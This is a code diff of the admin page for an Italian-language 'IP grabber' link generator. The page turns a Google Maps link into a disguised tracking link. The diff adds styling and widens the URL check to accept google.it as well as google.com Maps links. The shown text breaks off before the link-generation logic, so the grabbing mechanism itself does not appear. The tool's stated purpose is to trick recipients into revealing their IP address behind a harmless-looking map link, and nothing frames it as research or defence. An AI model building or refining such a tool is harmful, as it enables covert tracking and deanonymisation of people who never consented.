@@ -3,26 +3,37 @@
 <head>
   <meta charset="UTF-8">
   <title>Admin - Genera Link IP Grabber</title>
+  <style>
+    body { font-family: Arial; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .box { text-align: center; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); width: 80%; max-width: 600px; }
+    h2 { margin-bottom: 20px; }
+    input, button { font-size: 16px; padding: 10px; margin-top: 10px; }
+    input { width: 100%; max-width: 500px; }
+    button { background-color: #4285F4; color: white; border: none; cursor: pointer; }
+    button:hover { background-color: #356AC7; }
+    p { font-size: 16px; margin-top: 20px; }
+  </style>
 </head>
 <body>
-  <h2>Inserisci una posizione di Google Maps</h2>
-  
-  <label for="maps-link">Link di Google Maps (es. https://www.google.com/maps?q=45.4642,9.1900):</label><br>
-  <input type="text" id="maps-link" placeholder="Es. https://www.google.com/maps?q=45.4642,9.1900"><br><br>
-  
-  <!-- Pulsante per generare il link -->
-  <button onclick="generaLink()">Genera Link IP Grabber</button>
-  
-  <h3>Link IP Grabber</h3>
-  <p id="link-output"></p>
+  <div class="box">
+    <h2>Genera Link IP Grabber da Google Maps</h2>
+    
+    <label for="maps-link">Inserisci il link di Google Maps (come esempio https://www.google.it/maps/place/...):</label><br>
+    <input type="text" id="maps-link" placeholder="Es. https://www.google.it/maps/place/..."><br><br>
+    
+    <button onclick="generaLink()">Genera Link IP Grabber</button>
+    
+    <h3>Link IP Grabber:</h3>
+    <p id="link-output"></p>
+  </div>
 
   <script>
     // Funzione per generare il link di IP grabber
     function generaLink() {
       const mapsLink = document.getElementById('maps-link').value;
       
-      // Verifica se il link di Google Maps è valido
-      if (!mapsLink.includes("https://www.google.com/maps?q=")) {
+      // Verifica se il link contiene 'https://www.google.com/maps' o 'https://www.google.it/maps'
+      if (!mapsLink.includes("https://www.google.com/maps") && !mapsLink.includes("https://www.google.it/maps")) {
         alert("Per favore, inserisci un link valido di Google Maps.");
         return;
       }
